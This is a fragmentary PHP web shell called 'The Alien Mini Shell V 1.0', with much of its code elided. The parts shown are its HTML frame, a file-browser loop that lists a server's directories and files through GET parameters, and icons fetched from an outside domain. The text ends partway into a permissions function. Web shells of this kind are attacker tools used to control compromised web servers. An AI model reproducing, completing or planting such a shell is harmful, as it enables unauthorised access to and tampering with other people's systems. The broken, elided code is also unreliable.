...
<h1><center>The Alien Mini Shell V 1.0</center></h1>
...
<title>The Alien Mini Shell V 1.0</title>
<style>
body{
...
if(isset($_GET['filesrc'])){
    ...
    foreach($scandir as $dir){
        ...
        echo "<tr>
        <td><a href=\"?y=$path/$dir\"><img src=\"http://www.ijazurrahim.cf/folder.png\" />&nbsp;&nbsp;$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
    ...
    foreach($scandir as $file){
        ...
        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&y=$path\"><img src=\"http://www.ijazurrahim.cf/file.png\" />&nbsp;&nbsp;$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
...
echo '<br /><center>The Alien Mini Shell Shell Version <font color="red">1.0</font></center>
</BODY>
</HTML>';
function perms($file){
